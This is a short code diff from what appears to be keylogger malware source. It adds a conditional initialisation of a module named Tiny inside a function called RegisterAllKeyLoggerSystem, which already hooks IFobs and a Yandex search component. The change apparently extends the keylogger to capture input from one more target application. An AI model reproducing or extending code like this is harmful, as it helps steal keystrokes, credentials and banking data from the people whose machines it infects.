@@ -211,6 +211,10 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const 
 		IFobs::Init(appName);
 	#endif
 
+	#ifdef TinyH
+		Tiny::Init(appName);
+	#endif
+
 	#ifdef YandexH
 		YandexSearchJpg::Init();
 	#endif
